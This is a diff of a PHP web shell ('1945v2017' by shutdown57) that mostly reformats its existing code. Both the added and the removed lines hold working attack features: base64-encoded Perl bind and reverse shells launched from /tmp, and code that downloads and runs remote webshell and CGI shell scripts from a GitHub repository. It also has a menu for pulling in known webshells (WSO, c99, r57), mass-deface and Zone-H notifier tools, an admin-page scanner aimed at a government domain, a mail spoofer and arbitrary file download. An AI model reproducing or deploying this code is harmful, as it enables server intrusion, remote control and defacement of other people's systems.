-		echo "<script>window.open('awesome1945.php');</script>";
-		echo "Not redirected ? <a href='awesome1945.php' target='_blank'> Click here nubz !</a> :'v ";
-		$html->actdone();
-	}else{
-		$html->actfail();
-		$html->show("</center>");
-	}
-}elseif ($__action__ == "kcy") {
-	$ak = "?__merdeka__=$dir&__action__=";
-	$html->show("<center><div class=\"kuchiyose\">");
-	$html->show($html->h1("kuchiyose No Jutsu :*"));
-	$kcy = $html->li($html->a($ak."kuchiyose_wso","WSO 2.5",""));
-	$kcy.= $html->li($html->a($ak."kuchiyose_b374k","b374k 2.8",""));
-	$kcy.= $html->li($html->a($ak."kuchiyose_idx","indoXploit v2",""));
-	$kcy.= $html->li($html->a($ak."kuchiyose_1945","1945 freedom is real",""));
-	$kcy.= $html->li($html->a($ak."kuchiyose_ayana","Ayana Shahab Priv8 Shell",""));
-	$kcy.= $html->li($html->a($ak."kuchiyose_lc","linuXcode v2017",""));
-	$kcy.= $html->li($html->a($ak."kuchiyose_wa","WebAdmin",""));
-	$kcy.= $html->li($html->a($ak."kuchiyose_ms","Mini-Shell",""));
-	$kcy.= $html->li($html->a($ak."kuchiyose_it","ITSecTeam",""));
-	$kcy.= $html->li($html->a($ak."kuchiyose_c99","c99 shell",""));
-	$kcy.= "<br>";
-	$kcy.= $html->li($html->a($ak."kuchiyose_r57","r57 shell",""));
-	$kcy.= $html->li($html->a($ak."kuchiyose_symb","Symlink Mobile",""));
-	$kcy.= $html->li($html->a($ak."kuchiyose_symsa","Symlink Sa 3.0",""));
-	$kcy.= $html->li($html->a($ak."kuchiyose_md","Mass Deface",""));
-	$kcy.= $html->li($html->a($ak."kuchiyose_zh","Zone-H Notifier",""));
-	$kcy.= $html->li($html->a($ak."kuchiyose_adminer","Adminer",""));
-	$ul = $html->ul($kcy);
-	$html->show($ul);
-	$html->show("</div></center>");
+	$input ="<label for=\"mode\">Operate :</label>".$html->select("mode",$opt,"class=\"input_m\" style=\"width:300px\"");$input.= $html->submit("hash","value=\"Hash !\"");$input.= $html->submit("encode","value=\"Encode !\"");$input.= $html->submit("decode","value=\"Decode !\"");$vall =(empty($_POST)) ? "// String Tools c0ded by shutdown57" : $vall=$val;$input.= "<br>".$html->textarea("str",$val,"");$html->show($html->form("POST",$input)); }elseif ($__action__ == "net") {$html->show("<center>");$html->show($html->h1("Network ")."</center>");$html->show("<b>Bind Port ::</b>");$input_bp = $html->input("text","binport","value=\"1945\"","Port ");$input_bp.= $html->submit("sbp","value=\"Connect !\"");$input_bc = $html->input("text","ipbc","value=\"".gethostbyname($_SERVER['HTTP_HOST'])."\"","Server ");$input_bc.="  ".$html->input("text","pbc","value=\"1945\"","Port ");$input_bc.= $html->submit("sbc","value=\"Connect !\"");$html->show($html->form("POST",$input_bp));$html->show("<br>");$html->show("<b>Backconnect ::</b>");$html->show($html->form("POST",$input_bc));
+if(isset($_POST['sbp'])){$script_bind_port = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";$act->simpantext("/tmp/1945_bp.pl",base64_decode($script_bind_port));$port = $_POST['bindport'];$res = FileMan45::cmd("perl /tmp/1945_bp.pl 1>/dev/null 2>&1 &");$html->show("<pre class=\"code\">");$html->show($res."\n\n");$html->show(FileMan45::cmd("ps aux | grep 1945_bp.pl"));unlink("/tmp/1945_bp.pl");$html->show("</pre>"); }
+if(isset($_POST['sbc'])){$script_back_connect = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQokc2ggPSAiZXhwb3J0IFRFUk09eHRlcm07UFMxPSdcJFBXRCBbMTk0NXYyMDE3XSA+JztleHBvcnQgUFMxOy9iaW4vc2ggLWkiOw0Kc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KY29ubmVjdChTT0NLRVQsICRwYWRkcikgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0Kb3BlbihTVERJTiwgIj4mU09DS0VUIik7DQpvcGVuKFNURE9VVCwgIj4mU09DS0VUIik7DQpvcGVuKFNUREVSUiwgIj4mU09DS0VUIik7DQpzeXN0ZW0oJ2VjaG8gIistLS0tLVsgMTk0NXYyMDE3IHNoZWxsIGMwZGVkIGJ5IDogc2h1dGRvd241NyBdLS0tLS0rIicpOw0Kc3lzdGVtKCdlY2hvICIrLS0tLS0tLS0tLVsgNzJ0aCBJbmRvbmVzaWEgTWVyZGVrYSBdLS0tLS0tLS0tKyIgOyBbK10gd2FpdCAuLiA7IHNsZWVwIDUnKTsNCnN5c3RlbSgkc2gpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";$act->simpantext("/tmp/1945_bc.pl",base64_decode($script_back_connect));$port = $_POST['pbc'];$ip   = $_POST['ipbc'];$res = FileMan45::cmd("perl /tmp/1945_bc.pl $ip $port 1>/dev/null 2>&1 &");$html->show("<pre class=\"code\">");$html->show($res,"\n\n");$html->show(FileMan45::cmd("ps aux | grep 1945_bc.pl"));unlink("/tmp/1945_bc.pl");$html->show("</pre>");}
+}elseif ($__action__ == "mail") {$html->show("<center>");$html->show($html->h1("Mail Sender"));$form = $html->input("text","to","value=\"webmaster@localhost\""," To ");$form.= $html->input("text","from","value=\"shutdown57@indonesia.go.id\""," From ");$form.= $html->input("text","subjek","value=\":* kissed\""," Subject ");$form.= $html->submit("sent","value=\"send email!\"");$form.= $html->textarea("konten","// Patch Ur Faces~","");$html->show($html->form("POST",$form));$html->show("</center>"); if(isset($_POST['sent'])) {$to = $_POST['to'];$from = $_POST['from'];$subjek = $_POST['subjek'];$konten = $_POST['konten'];if(mail($to,$subject,$konten,$from)){$html->show("<b> Email Sent Successfuly ~</b>");$html->actdone();}else{$html->show("<b> Email Sent Failed ~</b>");$html->actfail();} }
+}elseif ($__action__ == "rsw") {if(Act45::getscript("awesome1945.php","https://raw.githubusercontent.com/alintamvanz/webshell/master/awesome1945.php")){ $html->show("<center>"); echo "<script>window.open('awesome1945.php');</script>"; echo "Not redirected ? <a href='awesome1945.php' target='_blank'> Click here nubz !</a> :'v "; $html->actdone();}else{ $html->actfail(); $html->show("</center>");}
+}elseif ($__action__ == "kcy") { $ak = "?__merdeka__=$dir&__action__="; $html->show("<center><div class=\"kuchiyose\">"); $html->show($html->h1("kuchiyose No Jutsu :*")); $kcy = $html->li($html->a($ak."kuchiyose_wso","WSO 2.5","")); $kcy.= $html->li($html->a($ak."kuchiyose_b374k","b374k 2.8","")); $kcy.= $html->li($html->a($ak."kuchiyose_idx","indoXploit v2","")); $kcy.= $html->li($html->a($ak."kuchiyose_1945","1945 freedom is real","")); $kcy.= $html->li($html->a($ak."kuchiyose_ayana","Ayana Shahab Priv8 Shell","")); $kcy.= $html->li($html->a($ak."kuchiyose_lc","linuXcode v2017","")); $kcy.= $html->li($html->a($ak."kuchiyose_wa","WebAdmin","")); $kcy.= $html->li($html->a($ak."kuchiyose_ms","Mini-Shell","")); $kcy.= $html->li($html->a($ak."kuchiyose_it","ITSecTeam","")); $kcy.= $html->li($html->a($ak."kuchiyose_c99","c99 shell","")); $kcy.= "<br>"; $kcy.= $html->li($html->a($ak."kuchiyose_r57","r57 shell","")); $kcy.= $html->li($html->a($ak."kuchiyose_symb","Symlink Mobile","")); $kcy.= $html->li($html->a($ak."kuchiyose_symsa","Symlink Sa 3.0","")); $kcy.= $html->li($html->a($ak."kuchiyose_md","Mass Deface","")); $kcy.= $html->li($html->a($ak."kuchiyose_zh","Zone-H Notifier","")); $kcy.= $html->li($html->a($ak."kuchiyose_adminer","Adminer","")); $ul = $html->ul($kcy); $html->show($ul); $html->show("</div></center>");
 	//kuchiyose started
 }elseif ($__action__ == "kuchiyose_wa") {echo "<center><h1>kuchiyose No Jutsu : ".$__action__."</h1>";$html->show($act->kuchiyose($__action__));echo "</center>";}elseif ($__action__ == "kuchiyose_r57") {echo "<center><h1>kuchiyose No Jutsu : ".$__action__."</h1>";$html->show($act->kuchiyose($__action__));echo "</center>";}elseif ($__action__ == "kuchiyose_wso") {echo "<center><h1>kuchiyose No Jutsu : ".$__action__."</h1>"; $html->show($act->kuchiyose($__action__));echo "</center>";}elseif($__action__ == "kuchiyose_idx"){echo "<center><h1>kuchiyose No Jutsu : ".$__action__."</h1>"; $html->show($act->kuchiyose($__action__)); echo "</center>";}elseif($__action__ == "kuchiyose_b374k"){	echo "<center><h1>kuchiyose No Jutsu : ".$__action__."</h1>";
 	$html->show($act->kuchiyose($__action__)); echo "</center>";}elseif($__action__ == "kuchiyose_1945"){echo "<center><h1>kuchiyose No Jutsu : ".$__action__."</h1>"; $html->show($act->kuchiyose($__action__)); echo "</center>";}elseif($__action__ == "kuchiyose_ayana"){ echo "<center><h1>kuchiyose No Jutsu : ".$__action__."</h1>"; $html->show($act->kuchiyose($__action__)); echo "</center>";}elseif($__action__ == "kuchiyose_lc"){echo "<center><h1>kuchiyose No Jutsu : ".$__action__."</h1>"; $html->show($act->kuchiyose($__action__)); echo "</center>";}elseif($__action__=="kuchiyose_it"){echo "<center><h1>kuchiyose No Jutsu : ".$__action__."</h1>"; $html->show($act->kuchiyose($__action__)); echo "</center>";}elseif($__action__=="kuchiyose_ms"){echo "<center><h1>kuchiyose No Jutsu : ".$__action__."</h1>"; $html->show($act->kuchiyose($__action__)); echo "</center>";}elseif($__action__=="kuchiyose_c99"){echo "<center><h1>kuchiyose No Jutsu : ".$__action__."</h1>"; $html->show($act->kuchiyose($__action__)); echo "</center>";}elseif($__action__ == "kuchiyose_adminer"){echo "<center><h1>kuchiyose No Jutsu : ".$__action__."</h1>"; $html->show($act->kuchiyose($__action__)); echo "</center>";} // end kuchiyose
 	elseif($__action__ == "adm")
-	{
-		$html->show("<center>");
-		$html->show($html->h1("Admin Finder"));
-		if(empty($_POST['scan']))
-		{
-		$input = $html->input("text","url","value=\"http://indonesian.go.id\"","Target URL ");
-		$input.= $html->submit("scan","value=\"find admin\"");
-		$input.= "<br><br> <b> Worldlist</b><br>";
-		$val = $act->getcontent("https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/wordlist_af.txt");
-		$input.= $html->textarea("wordlist",$val,"style=\"width:400px;height:250px\"");
-		$html->show($html->form("POST",$input)."</center>");
-	
-		}else{
-			if(!empty($_POST['url']))
-			{
-				$html->show("<div class=\"code\" style=\"text-align:left;\">");
-				$e = explode("\n",$_POST['wordlist']);
-				$url = $_POST['url'];
-				foreach($e as $wordlist){
-				$admin = array("admin","password","username","login","masuk","daftar","register");
-				if(preg_match('/'.implode("|",$admin).'/i',$act->getcontent($url."/".$wordlist))){
-					$html->show("    [ <font color=lime>FOUND</font> ] ".$url."/".$wordlist."<br>");
-				}else{
-					$html->show("  [ <font color=red>NOT FOUND</font> ] ".$url."/".$wordlist."<br>");
-				}
-			}
-			$html->show("</div>");
+	{$html->show("<center>");$html->show($html->h1("Admin Finder"));if(empty($_POST['scan'])){$input = $html->input("text","url","value=\"http://indonesian.go.id\"","Target URL ");$input.= $html->submit("scan","value=\"find admin\"");$input.= "<br><br> <b> Worldlist</b><br>";$val = $act->getcontent("https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/wordlist_af.txt");$input.= $html->textarea("wordlist",$val,"style=\"width:400px;height:250px\"");$html->show($html->form("POST",$input)."</center>");}else{if(!empty($_POST['url'])){$html->show("<div class=\"code\" style=\"text-align:left;\">");$e = explode("\n",$_POST['wordlist']);$url = $_POST['url'];foreach($e as $wordlist){$admin = array("admin","password","username","login","masuk","daftar","register");if(preg_match('/'.implode("|",$admin).'/i',$act->getcontent($url."/".$wordlist))){$html->show("    [ <font color=lime>FOUND</font> ] ".$url."/".$wordlist."<br>");}else{$html->show("  [ <font color=red>NOT FOUND</font> ] ".$url."/".$wordlist."<br>");}}$html->show("</div>");
 		}
 	}
 }elseif($__action__ == "abt")
-{
-	$html->show("<center>");
-	$html->show($html->h1("About 1945v2017"));
-	$html->show("<b>MerdekaAtoeMati</b><br>");
-	$html->show("<i>1945 shell by : ".$html->a("https://facebook.com/JKT48.co","shutdown57","target=\"_blank\"")."</i>");
-	$html->show(base64_decode(base64_decode("UEhBK1BHSStVSEp2YTJ4aGJXRnphVHd2WWo0OEwzQStEUW84YVQ1TFlXMXBJR0poYm1kellTQkpibVJ2Ym1WemFXRWdaR1Z1WjJGdUlHbHVhU0J0Wlc1cVlYUmhhMkZ1SUd0bGJXVnlaR1ZyWVdGdUlFbHVaRzl1WlhOcFlTdzhZbkkrRFFwSVlXd3RhR0ZzSUdwaGJtY2diV1Z1WjJWdVlXa2djR1Z0YVc1a1lXaGhiaUJyWld0dlpXRnpZV0Z1SUdSaGJpQnNZV2x1TFd4aGFXNDhZbkkrRFFwa2FTQnpaV3hsYm1kbllYSmhhMkZ1SUdSbGJtZGhiaUIwYW1GeVlTQnpZV3R6WVcxaElHUmhiaUJrWVd4aGJTQjBhV1Z0Y0c4Z2FtRnVaeUJ6WlhOcGJtZHJZWFF0YzJsdVoydGhkRzVxWVR4aWNqNE5Dand2YVQ0OFlpQmhiR2xuYmoxeWFXZDBQa1JxWVd0aGNuUmhMREUzTFRBNExURTVORFVnUEdKeVBpQkJkR0Z6SUc1aGJXRWdZbUZ1WjNOaElFbHVaRzl1WlhOcFlUeGljajRnVTI5bGEyRnlibThnTFNCSVlYUjBZVHd2WWo0PQ==")));
+{$html->show("<center>");$html->show($html->h1("About 1945v2017"));$html->show("<b>MerdekaAtoeMati</b><br>");$html->show("<i>1945 shell by : ".$html->a("https://facebook.com/JKT48.co","shutdown57","target=\"_blank\"")."</i>");$html->show(base64_decode(base64_decode("UEhBK1BHSStVSEp2YTJ4aGJXRnphVHd2WWo0OEwzQStEUW84YVQ1TFlXMXBJR0poYm1kellTQkpibVJ2Ym1WemFXRWdaR1Z1WjJGdUlHbHVhU0J0Wlc1cVlYUmhhMkZ1SUd0bGJXVnlaR1ZyWVdGdUlFbHVaRzl1WlhOcFlTdzhZbkkrRFFwSVlXd3RhR0ZzSUdwaGJtY2diV1Z1WjJWdVlXa2djR1Z0YVc1a1lXaGhiaUJyWld0dlpXRnpZV0Z1SUdSaGJpQnNZV2x1TFd4aGFXNDhZbkkrRFFwa2FTQnpaV3hsYm1kbllYSmhhMkZ1SUdSbGJtZGhiaUIwYW1GeVlTQnpZV3R6WVcxaElHUmhiaUJrWVd4aGJTQjBhV1Z0Y0c4Z2FtRnVaeUJ6WlhOcGJtZHJZWFF0YzJsdVoydGhkRzVxWVR4aWNqNE5Dand2YVQ0OFlpQmhiR2xuYmoxeWFXZDBQa1JxWVd0aGNuUmhMREUzTFRBNExURTVORFVnUEdKeVBpQkJkR0Z6SUc1aGJXRWdZbUZ1WjNOaElFbHVaRzl1WlhOcFlUeGljajRnVTI5bGEyRnlibThnTFNCSVlYUjBZVHd2WWo0PQ==")));
 
 
 }elseif($__action__ == "dl")
-{
-	 @ob_clean();
-    $file = $_GET['__files__'];
-    header('Content-Description: File Transfer');
-    header('Content-Type: application/octet-stream');
-    header('Content-Disposition: attachment; filename="'.basename($file).'"');
-    header('Expires: 0');
-    header('Cache-Control: must-revalidate');
-    header('Pragma: public');
-    header('Content-Length: ' . filesize($file));
-    readfile($file);
-    exit;
+{@ob_clean();
+ $file = $_GET['__files__'];
+ header('Content-Description: File Transfer');
+ header('Content-Type: application/octet-stream');
+ header('Content-Disposition: attachment; filename="'.basename($file).'"');
+ header('Expires: 0');
+ header('Cache-Control: must-revalidate');
+ header('Pragma: public');
+ header('Content-Length: ' . filesize($file));
+ readfile($file);
+ exit;
 }elseif($__action__ == "log")
-{
-	$dstr = session_destroy();
-	if($dstr == true)
-	{
-		$html->show("<script>alert('Bye !'); window.location.href='?__1945__';</script>");
-	}
+{$dstr = session_destroy();if($dstr == true){ $html->show("<script>alert('Bye !'); window.location.href='?__1945__';</script>");}
 }elseif($__action__ == "telnet")
-{
-$mkdir = @mkdir("1945_cgi",0755);
-$hta = "AddHandler cgi-script .pl \n AddHandler cgi-script .sh";
-$source = $act->getcontent("https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/cgi_telnet.pl");
-$act->simpantext("1945_cgi/.htaccess",$hta);
-$act->simpantext("1945_cgi/cgi_telnet.pl",$source);
-$html->show("<iframe src=\"1945_cgi/cgi_telnet.pl\" width=\"100%\" height=\"100%\" frameborder=\"0\"></iframe>");
-}elseif($__action__ == "sh")
-{
-$mkdir = @mkdir("1945_cgi/",0755);
-$hta = "AddHandler cgi-script .pl \n AddHandler cgi-script .sh";
-$source = $act->getcontent("https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/cgi_shell.sh");
-$act->simpantext("1945_cgi/.htaccess",$hta);
-$act->simpantext("1945_cgi/cgi_shell.sh",$source);
-$html->show($html->a("1945_cgi/cgi_shell.sh","Click Here, ",""));
-$html->show("<iframe src=\"1945_cgi/cgi_shell.sh\" width=\"100%\" height=\"100%\" frameborder=\"0\"></iframe>");
-}
-
-}else{
-
-$html->show("<form method=\"POST\"><table class=\"a_exp\" align=\"center\">");
-$html->show($html->th("No.").$html->th("*").$html->th("Files").$html->th("Size").$html->th("Type").$html->th("Date Modif").$html->th("Owner:Group").$html->th("Permission").$html->th("Action"));
-foreach($scandir as $d)
-{
+{$mkdir = @mkdir("1945_cgi",0755);$hta = "AddHandler cgi-script .pl \n AddHandler cgi-script .sh";$source = $act->getcontent("https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/cgi_telnet.pl");$act->simpantext("1945_cgi/.htaccess",$hta);$act->simpantext("1945_cgi/cgi_telnet.pl",$source);$html->show("<iframe src=\"1945_cgi/cgi_telnet.pl\" width=\"100%\" height=\"100%\" frameborder=\"0\"></iframe>");
+}elseif($__action__ == "sh"){$mkdir = @mkdir("1945_cgi/",0755);$hta = "AddHandler cgi-script .pl \n AddHandler cgi-script .sh";$source = $act->getcontent("https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/cgi_shell.sh");$act->simpantext("1945_cgi/.htaccess",$hta);$act->simpantext("1945_cgi/cgi_shell.sh",$source);$html->show($html->a("1945_cgi/cgi_shell.sh","Click Here, ",""));$html->show("<iframe src=\"1945_cgi/cgi_shell.sh\" width=\"100%\" height=\"100%\" frameborder=\"0\"></iframe>");}}else{$html->show("<form method=\"POST\"><table class=\"a_exp\" align=\"center\">");$html->show($html->th("No.").$html->th("*").$html->th("Files").$html->th("Size").$html->th("Type").$html->th("Date Modif").$html->th("Owner:Group").$html->th("Permission").$html->th("Action"));foreach($scandir as $d){
 	if(!is_dir("$dir/$d"))continue;
 	if($d == ".")
 	{
@@ -587,58 +234,17 @@ foreach($scandir as $d)
 	}else{
 		$f=$html->a("?__merdeka__=$dir/$d",$d,"");
 	}
-	$html->show($html->tr($html->td($no++).
-		$html->td("<input type='checkbox' name='seldir[]' value='".$dir."/".$d."'>").
-		$html->td("<img src=\"data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=\">[<b> ".$f." </b>]").
-		$html->td($fileman->getfsize("$dir/$d")).
-		$html->td($fileman->getmime("$dir/$d")).
-		$html->td($fileman->getfilemtime("$dir/$d")).
-		$html->td($fileman->getowner("$dir/$d").":".$fileman->getgroup("$dir/$d")).
-		$html->td($fileman->getperms("$dir/$d")).
-		$html->td($fileman->actiondir("$dir/$d"))));
+	$html->show($html->tr($html->td($no++). $html->td("<input type='checkbox' name='seldir[]' value='".$dir."/".$d."'>"). $html->td("<img src=\"data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=\">[<b> ".$f." </b>]"). $html->td($fileman->getfsize("$dir/$d")). $html->td($fileman->getmime("$dir/$d")). $html->td($fileman->getfilemtime("$dir/$d")). $html->td($fileman->getowner("$dir/$d").":".$fileman->getgroup("$dir/$d")). $html->td($fileman->getperms("$dir/$d")). $html->td($fileman->actiondir("$dir/$d"))));
 }
 foreach($scandir as $f)
 {
-	if(!is_file("$dir/$f")||$f=="."||$f=="..")continue;
-	$html->show($html->tr($html->td($no++).
-		$html->td("<input type='checkbox' name='selfile[]' value='".$dir."/".$f."'>").
-		$html->td("<img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII=\">- ".$html->a("?__files__=$dir/$f&__action__=view",$f,"")).
-		$html->td($fileman->getfsize("$dir/$f")).
-		$html->td($fileman->getmime("$dir/$f")).
-		$html->td($fileman->getfilemtime("$dir/$f")).
-		$html->td($fileman->getowner("$dir/$f").":".$fileman->getgroup("$dir/$f")).
-		$html->td($fileman->getperms("$dir/$f")).
-		$html->td($fileman->actionfile("$dir/$f"))));
+	if(!is_file("$dir/$f")||$f=="."||$f=="..")continue; $html->show($html->tr($html->td($no++). $html->td("<input type='checkbox' name='selfile[]' value='".$dir."/".$f."'>"). $html->td("<img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII=\">- ".$html->a("?__files__=$dir/$f&__action__=view",$f,"")). $html->td($fileman->getfsize("$dir/$f")). $html->td($fileman->getmime("$dir/$f")). $html->td($fileman->getfilemtime("$dir/$f")). $html->td($fileman->getowner("$dir/$f").":".$fileman->getgroup("$dir/$f")). $html->td($fileman->getperms("$dir/$f")). $html->td($fileman->actionfile("$dir/$f"))));
 }
 if(empty($_SESSION['files_select']))
-{
-$option_oo = array(
-	""=>"- action selected files-",
-	"delete"=>"delete",
-	"copy"=>"copy",
-	"cut"=>"cut",
-	"chmod"=>"chmod");
-}else{
-$option_oo = array(
-		""=>"- action selected files-",
-	"paste"=>"paste here",
-	"move"=>"move here",
-	"delete"=>"delete",
-	"copy"=>"copy",
-	"chmod"=>"chmod",
-	"cancel"=>"UnSelect");
-foreach($_SESSION['files_select'] as $op){$optv.=$html->option($op,basename($op));}
-$view ="File selected : ". $html->select("__action__",$optv,"class=\"input_m\" ");
-$per = substr(sprintf('%o', fileperms($op)),-4);
-}
-$input_chmod = $html->input("text","mode","value=\"".$per."\"","Permission ");
-$input_chmod.= $html->submit("chmod","value=\">>\"");
-$form_chmod = $html->form("POST",$input_chmod);
-if(!empty($_GET['_act'])=="chmod")  $chmod_form = $form_chmod; else ""; 
-foreach($option_oo as $name=>$val){ $opt .= $html->option($name,$val); }
-$select = $html->select("action",$opt,"class=\"input_m\"").$html->submit("sbmt","value=\">>\" ");
-$html->show($html->tr("<td colspan='9'>".$select." ".$view. " ".$chmod_form."</td>"));
-if(isset($_POST['sbmt'])){if(!empty($_POST['seldir'])){ $seldir = $_POST['seldir'];if($_POST['action']=='delete'){if(is_array($_POST['seldir'])){ foreach($seldir as $deldir){$act->delete($deldir);$html->show("<meta http-equiv='refresh' content='0;url='>"); }}else{$act->delete($seldir);$html->show("<meta http-equiv='refresh' content='0;url='>"); }}
+{$option_oo = array(""=>"- action selected files-","delete"=>"delete","copy"=>"copy","cut"=>"cut","chmod"=>"chmod");
+}else{$option_oo = array(""=>"- action selected files-","paste"=>"paste here","move"=>"move here","delete"=>"delete","copy"=>"copy","chmod"=>"chmod","cancel"=>"UnSelect");
+foreach($_SESSION['files_select'] as $op){$optv.=$html->option($op,basename($op));} $view ="File selected : ". $html->select("__action__",$optv,"class=\"input_m\" "); $per = substr(sprintf('%o', fileperms($op)),-4);
